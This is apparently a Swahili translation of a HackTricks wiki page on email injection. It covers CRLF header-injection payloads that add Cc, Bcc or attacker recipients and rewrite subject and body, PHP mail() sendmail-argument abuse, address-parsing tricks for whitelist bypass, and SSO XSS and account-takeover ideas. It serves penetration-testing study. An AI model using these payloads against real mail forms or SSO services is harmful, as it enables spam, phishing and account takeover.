# Kuingiza Barua pepe

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za **jamii ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kuingiza kwenye barua pepe iliyotumwa

### Kuingiza Cc na Bcc baada ya hoja ya mtumaji
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Ujumbe utatumwa kwa akaunti za mpokeaji na mpokeaji1.

### Ingiza hoja
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Ujumbe utatumwa kwa mpokeaji wa awali na akaunti ya mshambuliaji.

### Ingiza hoja ya Mada
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
### Badilisha mwili wa ujumbe

Ingiza mstari wa mstari mmoja, kisha andika ujumbe wako ili kubadilisha mwili wa ujumbe.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Utekaji wa kazi ya kazi ya PHP mail()
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Parameta ya 5 ($additional\_parameters)

Sehemu hii itazingatia **jinsi ya kutumia parameta hii ikidhaniwa kuwa muhusika anaidhibiti**.

Parameta hii itaongezwa kwenye mstari wa amri PHP itakayotumia kuita sendmail binary. Hata hivyo, itasafishwa na kazi `escapeshellcmd($additional_parameters)`.

Mtu mhalifu anaweza **kuingiza vigezo vya ziada kwa sendmail** katika kesi hii.

#### Tofauti katika utekelezaji wa /usr/sbin/sendmail

**Kiolesura cha sendmail** kinatolewa na programu ya barua pepe ya MTA (Sendmail, Postfix, Exim n.k.) iliyosakinishwa kwenye mfumo. Ingawa **kazi msingi** (kama vile vigezo vya -t -i -f) inabaki **sawa** kwa sababu za utangamano, **kazi na vigezo vingine** vinatofautiana sana kulingana na MTA iliyosakinishwa.

Hapa kuna mifano michache ya kurasa tofauti za man ya amri/kiolesura cha sendmail:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

Kulingana na **asili ya sendmail** binary, chaguo tofauti zimegunduliwa kuzitumia na kusababisha **kuvuja kwa faili au hata kutekeleza amri za kupindukia**. Angalia jinsi ya kufanya hivyo katika [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Kuingiza kwenye jina la barua pepe

### Sehemu zilizopuuzwa za barua pepe

Alama: **+, -** na **{}** kwa nadra zinaweza kutumika kwa alama na kupuuzwa na seva nyingi za barua pepe

* K.m. john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Maoni kati ya mabano ()** mwanzoni au mwishoni pia yatapuuzwa

* K.m. john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Kupitisha orodha nyeupe

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Alama za nukuu

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Unaweza pia kutumia IPs kama majina ya kikoa kati ya mabano ya mraba:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Mapungufu mengine

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## SSO ya Mhusika wa Tatu

### XSS

Baadhi ya huduma kama **github** au **salesforce inaruhusu** kuunda **anwani ya barua pepe na mizigo ya XSS**. Ikiwa unaweza **tumia watoa huduma hawa kuingia kwenye huduma zingine** na huduma hizi **hazisafishi** barua pepe kwa usahihi, unaweza kusababisha **XSS**.

### Kuchukua-Utawala wa Akaunti

Ikiwa **huduma ya SSO** inaruhusu kuunda akaunti bila kuthibitisha anwani ya barua pepe iliyotolewa (kama **salesforce**) na kisha unaweza kutumia akaunti hiyo kuingia kwenye huduma tofauti ambayo **inaamini** salesforce, unaweza kupata akaunti yoyote.\
_Taarifa kwamba salesforce inaonyesha ikiwa barua pepe iliyotolewa ilithibitishwa au la, hivyo programu inapaswa kuzingatia habari hii._

## Jibu-Kwa

Unaweza kutuma barua pepe ukitumia _**Kutoka: kampuni.com**_ na _**Jibu-Kwa: muhusika.com**_ na ikiwa **jibu la moja kwa moja** linatumwa kwa sababu barua pepe ilitumwa **kutoka** kwa **anwani ya ndani** mhalifu anaweza **kupokea** jibu hilo.

## Kiwango cha Kupinga Kupokea

Huduma fulani, kama AWS, inatekeleza kizingiti kinachoitwa **Kiwango cha Kupinga Kupokea**, kawaida kikiwekwa kwa 10%. Hii ni takwimu muhimu, hasa kwa huduma za utoaji wa barua pepe. Wakati kiwango hiki kinapozidiwa, huduma, kama huduma ya barua pepe ya AWS, inaweza kusimamishwa au kuzuiliwa.

**Kupinga kwa nguvu** kunahusu **barua pepe** ambayo imerudishwa kwa mtumaji kwa sababu anwani ya mpokeaji ni batili au haipo. Hii inaweza kutokea kwa sababu mbalimbali, kama vile barua pepe kutumwa kwa anwani isiyopo, kikoa kisichokuwepo, au kukataa kwa seva ya mpokeaji kukubali **barua pepe**.

Katika muktadha wa AWS, ikiwa unatuma barua pepe 1000 na 100 kati yao zinasababisha kupinga kwa nguvu (kwa sababu kama anwani batili au vikoa), hii itamaanisha kiwango cha kupinga kwa nguvu cha 10%. Kufikia au kuzidi kiwango hiki kunaweza kusababisha AWS SES (Huduma Rahisi ya Barua pepe) kuzuia au kusimamisha uwezo wako wa kutuma barua pepe.

Ni muhimu kudumisha kiwango cha chini cha kupinga kwa nguvu ili kuhakikisha huduma ya barua pepe isiyovurugwa na kudumisha sifa ya mtumaji. Kufuatilia na kusimamia ubora wa anwani za barua pepe kwenye orodha yako ya kutuma barua pepe kunaweza kusaidia sana katika kufanikisha hili.

Kwa habari zaidi, unaweza kurejelea hati rasmi ya AWS kuhusu kushughulikia kupinga na malalamiko [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## Marejeo

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections) kujenga na **kutumia taratibu za kiotomatiki** zilizotengenezwa na zana za jamii za juu zaidi duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
